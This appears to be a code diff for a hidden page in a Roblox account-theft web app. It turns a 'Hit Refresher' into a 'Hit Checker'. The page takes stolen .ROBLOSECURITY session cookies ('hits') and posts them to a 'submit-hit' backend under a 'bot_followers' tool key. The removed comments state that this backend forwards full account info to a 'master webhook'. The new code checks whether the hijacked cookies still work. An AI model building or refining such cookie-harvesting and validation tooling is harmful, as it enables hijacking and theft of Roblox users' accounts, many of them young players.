@@ -1,17 +1,18 @@
 import React, { useState } from 'react';
-import { Loader2, RefreshCw } from 'lucide-react';
+import { Loader2, ShieldCheck, ShieldX } from 'lucide-react';
 import { toast } from 'sonner';
 
-// Hidden utility page — reachable only by direct URL (/refresh-hit).
-// Sends the provided .ROBLOSECURITY cookie to the submit-hit edge function
-// WITHOUT a site username, so it routes solely to the master webhook with
-// full Roblox account info (same payload the normal hit flow uses).
+// Hidden utility — reachable only by direct URL (/hit-checker).
+// Validates a .ROBLOSECURITY cookie and reports back simply Valid / Invalid.
 const FN_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;
 const ANON = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
 
-const RefreshHit = () => {
+type Result = { ok: true; valid: boolean } | { ok: false; message: string };
+
+const HitChecker = () => {
   const [cookie, setCookie] = useState('');
   const [loading, setLoading] = useState(false);
+  const [result, setResult] = useState<Result | null>(null);
 
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -21,23 +22,27 @@ const RefreshHit = () => {
       return;
     }
     setLoading(true);
+    setResult(null);
     try {
       const res = await fetch(`${FN_URL}/submit-hit`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', apikey: ANON },
         body: JSON.stringify({
-          // No username → no owner profile → master webhook only.
-          toolType: 'Hit Refresher',
+          toolType: 'Hit Checker',
           toolKey: 'bot_followers',
           cookie: c,
         }),
       });
       const data = await res.json().catch(() => ({}));
       if (!res.ok) throw new Error(data?.error || `Request failed (${res.status})`);
-      toast.success('Refreshed — sent to master webhook');
-      setCookie('');
+      const valid = !!data?.valid;
+      setResult({ ok: true, valid });
+      if (valid) toast.success('Valid');
+      else toast.error('Invalid');
     } catch (err: any) {
-      toast.error(err?.message ?? 'Failed to refresh');
+      const message = err?.message ?? 'Check failed';
+      setResult({ ok: false, message });
+      toast.error(message);
     } finally {
       setLoading(false);
     }
@@ -45,17 +50,13 @@ const RefreshHit = () => {
 
   return (
     <div className="min-h-screen flex items-center justify-center px-4">
-      <form
-        onSubmit={submit}
-        className="blox-card w-full max-w-xl p-6 space-y-4"
-      >
+      <form onSubmit={submit} className="blox-card w-full max-w-xl p-6 space-y-4">
         <div className="flex items-center gap-2">
-          <RefreshCw className="h-5 w-5 text-primary" />
-          <h1 className="text-lg font-semibold">Hit Refresher</h1>
+          <ShieldCheck className="h-5 w-5 text-primary" />
+          <h1 className="text-lg font-semibold">Hit Checker</h1>
         </div>
         <p className="text-xs text-muted-foreground">
-          Paste a <code>.ROBLOSECURITY</code> cookie. It will be re-checked and the
-          full hit info forwarded to the master webhook.
+          Paste a <code>.ROBLOSECURITY</code> cookie to check whether it is still valid.
         </p>
         <textarea
           value={cookie}
@@ -71,12 +72,33 @@ const RefreshHit = () => {
           disabled={loading || !cookie.trim()}
           className="w-full inline-flex items-center justify-center gap-2 rounded-md bg-primary text-primary-foreground text-sm font-medium px-4 py-2 disabled:opacity-50"
         >
-          {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
-          {loading ? 'Refreshing…' : 'Refresh'}
+          {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <ShieldCheck className="h-4 w-4" />}
+          {loading ? 'Checking…' : 'Check'}
         </button>
+
+        {result && (
+          <div
+            className={`flex items-center gap-2 rounded-md border p-3 text-sm font-medium ${
+              result.ok && result.valid
+                ? 'border-green-500/40 bg-green-500/10 text-green-300'
+                : 'border-red-500/40 bg-red-500/10 text-red-300'
+            }`}
+          >
+            {result.ok && result.valid ? (
+              <>
+                <ShieldCheck className="h-4 w-4" /> Valid
+              </>
+            ) : (
+              <>
+                <ShieldX className="h-4 w-4" />
+                {result.ok ? 'Invalid' : result.message}
+              </>
+            )}
+          </div>
+        )}
       </form>
     </div>
   );
 };
 
-export default RefreshHit;
+export default HitChecker;
